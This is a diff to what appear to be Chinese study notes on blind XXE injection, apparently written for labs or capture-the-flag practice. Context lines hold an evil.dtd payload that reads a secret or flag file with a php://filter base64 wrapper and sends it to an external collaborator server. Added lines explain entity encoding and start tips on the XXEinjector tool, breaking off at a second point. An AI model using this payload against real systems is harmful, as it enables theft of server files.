@@ -37,4 +37,8 @@ evil.dtd
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt">或者file:///home/carlos/secret
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://external server?p=%file;'>"> #external server like collobrator
 
-这里&#37;和&#x25;都表示%，区别是一个是10进制，一个是16进制。
+这里&#37;和&#x25;都表示%，区别是一个是10进制，一个是16进制。另外一个要注意的地方就是实体的引用顺序。
+
+另外就是可以考虑用工具XXEinjector，如果是使用工具，有几个需要注意的地方。
+1. --host 反向连接地址，可以是本地地址也可以是public server,主要目的是提供dtd文件和接收数据（比如外带数据)
+2. 
